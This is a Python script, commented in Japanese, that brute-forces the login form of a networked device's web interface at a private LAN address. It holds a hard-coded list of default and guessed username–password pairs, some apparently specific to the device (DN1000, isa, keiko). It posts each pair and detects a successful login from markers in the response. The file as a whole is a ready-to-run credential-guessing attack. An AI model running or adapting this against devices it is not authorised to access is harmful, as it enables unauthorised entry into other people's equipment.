# -*- coding: utf-8 -*-
"""Web UI のログインを総当たり。MAX 8文字制限あり"""
import urllib.request, urllib.parse, urllib.error
import http.client, socket

HOST = "192.168.1.150"
PATH = "/cgi-bin/login.cgi"

# MAX 8文字制限を考慮した候補
CREDS = [
    ("admin","admin"), ("admin","password"), ("admin","isa"),
    ("admin","keiko"), ("admin",""), ("admin","0000"),
    ("admin","1234"), ("admin","dn1000"), ("admin","DN1000"),
    ("root","root"), ("root","admin"), ("root","isa"),
    ("root","keiko"), ("root",""),
    ("isa","isa"), ("isa","admin"), ("isa","password"),
    ("keiko","keiko"), ("keiko","admin"),
    ("user","user"), ("user","password"),
    ("guest","guest"), ("guest",""),
    ("dn1000","dn1000"), ("DN1000","DN1000"),
    ("manager","manager"), ("admin","manager"),
    ("ISA","ISA"),
]

# HTTP/0.9 対応の低レベル接続
def low_level_post(host, path, body_str):
    conn = http.client.HTTPConnection(host, 80, timeout=5)
    try:
        conn.request("POST", path, body_str, {
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length": str(len(body_str)),
        })
        # HTTP/0.9 を受け取るため生ソケットで読む
        s = conn.sock
        s.settimeout(3)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
                if len(data) > 32768: break
        except socket.timeout:
            pass
        return data
    finally:
        conn.close()

def try_login(user, pw):
    body = urllib.parse.urlencode({"user":user,"password":pw,"login":"1","stat":"0"})
    try:
        resp = low_level_post(HOST, PATH, body)
    except Exception as e:
        return None, f"err:{e}"
    text = resp.decode("shift_jis","replace")
    # 失敗パターン検出
    fail_markers = ["ログイン画面","user","パスワード","login.cgi"]
    success_markers = ["メニュー","ログアウト","logout","monitor.cgi?stat=1","stat=2","unit","mon_setting"]
    # "login" の存在を手がかりに判断
    s_hit = any(m in text for m in success_markers)
    return s_hit, text[:200]

for u,p in CREDS:
    ok, snippet = try_login(u, p)
    mark = "*** HIT ***" if ok else "fail"
    print(f"{u:8s} / {p!r:12s}  [{mark}]")
    if ok:
        print(f"  snippet: {snippet}")
        break
